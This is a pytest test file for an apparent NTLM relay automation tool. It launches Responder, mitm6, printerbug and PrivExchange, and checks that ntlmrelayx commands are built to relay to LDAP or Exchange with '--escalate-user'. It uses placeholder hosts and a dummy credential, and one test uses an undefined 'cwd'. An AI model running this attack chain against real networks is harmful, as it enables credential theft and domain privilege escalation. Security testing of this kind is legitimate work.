from src.tools import *
from autorelayx import parse_args
from src.utils import get_local_ip, get_iface


def test_edit_responder_conf():
    cwd = os.getcwd()
    switch = 'Off'
    protocols = ['SMB', 'HTTP']
    conf = f'{cwd}/tools/Responder/Responder.conf'
    edit_responder_conf(switch, protocols, conf)
    smb_off = False
    http_off = False
    with open(conf, 'r+') as f:
        lines = f.readlines()
        for l in lines:
            if 'SMB = Off' in l:
                smb_off = True
            if 'HTTP = Off' in l:
                http_off = True
    assert smb_off == True
    assert http_off == True


def test_start_responder():
    iface = 'eth0'
    conf = f'{cwd}/tools/Responder/Responder.conf'
    responder = start_responder(iface, conf)
    assert int(responder.pid)
    print('Responder PID: ' + str(responder.pid))
    assert responder.kill()


def test_create_ntlmrelayx_cmd():
    privex_args = parse_args(
        ['--privexchange', '--httpattack', '--printerbug', '-e', '1.1.1.1', '-dc', '2.2.2.2', '-u',
         'DOMAIN/user:P@$/!s/:w0rd', '-6', '-d', 'domain', '-i', 'eth0'])
    relay_cmd = create_ntlmrelayx_cmd(privex_args)
    assert '--escalate-user' in relay_cmd
    assert '-t ldap://2.2.2.2' in relay_cmd
    assert '-6' in relay_cmd
    printerbug_args = parse_args(
        ['--printerbug', '--httpattack', '--printerbug', '-e', '1.1.1.1', '-dc', '2.2.2.2', '-u',
         'DOMAIN/user:P@$/!s/:w0rd', '-6', '-d', 'domain', '-i', 'eth0'])
    relay_cmd = create_ntlmrelayx_cmd(printerbug_args)
    assert '--escalate-user user' in relay_cmd
    assert '-t ldap://2.2.2.2' in relay_cmd
    httpattack_args = parse_args(
        ['--httpattack', '-e', '1.1.1.1', '-dc', '2.2.2.2', '-u', 'DOMAIN/user:P@$/!s/:w0rd', '-6', '-d', 'domain', '-i',
         'eth0', '-l', 'hostlist.txt'])
    relay_cmd = create_ntlmrelayx_cmd(httpattack_args)
    assert f'-t https://{httpattack_args.exchange_server}/EWS/Exchange.asmx' in relay_cmd
    assert '-6' in relay_cmd
    assert 'user' not in relay_cmd
    assert '2.2.2.2' not in relay_cmd
    assert 'eth0' not in relay_cmd
    hostlist_args = parse_args(
        ['-e', '1.1.1.1', '-dc', '2.2.2.2', '-u', 'DOMAIN/user:P@$/!s/:w0rd', '-d', 'domain', '-i', 'eth0', '-l',
         'hostlist.txt'])
    relay_cmd = create_ntlmrelayx_cmd(hostlist_args)
    assert '-tf unsigned-smb-hosts.txt' in relay_cmd
    assert 'user' not in relay_cmd
    assert '2.2.2.2' not in relay_cmd
    assert '1.1.1.1' not in relay_cmd
    assert 'eth0' not in relay_cmd
    assert '-6' not in relay_cmd
    targetfile_args = parse_args(
        ['-e', '1.1.1.1', '-dc', '2.2.2.2', '-u', 'DOMAIN/user:P@$/!s/:w0rd', '-6', '-d', 'domain', '-i', 'eth0', '-tf',
         'hostlist.txt'])
    relay_cmd = create_ntlmrelayx_cmd(targetfile_args)
    assert '-tf hostlist.txt' in relay_cmd
    assert 'user' not in relay_cmd
    assert '2.2.2.2' not in relay_cmd
    assert '1.1.1.1' not in relay_cmd
    assert 'eth0' not in relay_cmd
    assert '-tf unsigned-smb-hosts.txt' not in relay_cmd


# def test_start_ntlmrelayx():
#     args = parse_args(['-tf', 'unsigned-smb-hosts.txt'])
#     ntlmrelayx = start_ntlmrelayx(args)
#     assert int(ntlmrelayx.proc.pid)
#     assert ntlmrelayx.kill()
#     with open(ntlmrelayx.logfile, 'r+') as f:
#         lines = f.readlines()
#         assert len(lines) > 0

def test_start_mitm6():
    args = parse_args(['-6', '-d', 'DOM', '-i', 'eth0'])
    mitm6 = start_mitm6(args)
    assert int(mitm6.proc.pid)
    print('Mitm6 PID: ' + str(mitm6.pid))
    assert '-i eth0' in mitm6.cmd
    assert '-d DOM' in mitm6.cmd
    assert mitm6.kill()
    with open(mitm6.logfile, 'r+') as f:
        lines = f.readlines()
        assert len(lines) > 0


def test_start_printerbug():
    args = parse_args(['--printerbug', '-e', '1.1.1.1', '-dc', '2.2.2.2', '-u', 'DOMAIN/user:P@$/!s/:w0rd'])
    iface = get_iface()
    local_ip = get_local_ip(iface)
    printerbug = start_printerbug(args.user, args.exchange_server, local_ip)
    assert int(printerbug.proc.pid)
    print('Scan PID: ' + str(printerbug.pid))
    assert 'DOMAIN/user:P@$/!s/:w0rd' in printerbug.cmd
    assert '@1.1.1.1' in printerbug.cmd
    assert '2.2.2.2' not in printerbug.cmd
    assert local_ip in printerbug.cmd
    assert printerbug.kill()
    with open(printerbug.logfile, 'r+') as f:
        lines = f.readlines()
        assert len(lines) > 0


def test_start_exchange_scan():
    args = parse_args(['-e', '1.1.1.1', '-u', 'DOMAIN/user:P@$/!s/:w0rd'])
    scan = start_mic_scan(args)
    assert int(scan.proc.pid)
    print('Scan PID: ' + str(scan.pid))
    assert '1.1.1.1' in scan.cmd
    assert scan.kill()
    with open(scan.logfile, 'r+') as f:
        lines = f.readlines()
        assert len(lines) > 0


def test_start_privexchange():
    args = parse_args(['--privexchange', '-e', '1.1.1.1', '-dc', '2.2.2.2', '-u', 'DOMAIN/user:P@$/!s/:w0rd'])
    iface = get_iface()
    local_ip = get_local_ip(iface)
    privexchange = start_privexchange(args, local_ip)
    assert int(privexchange.proc.pid)
    print('Scan PID: ' + str(privexchange.pid))
    assert "-p 'P@$/!s/:w0rd'" in privexchange.cmd
    assert '1.1.1.1' in privexchange.cmd
    assert '2.2.2.2' not in privexchange.cmd
    assert local_ip in privexchange.cmd
    assert privexchange.kill()
    with open(privexchange.logfile, 'r+') as f:
        lines = f.readlines()
        assert len(lines) > 0
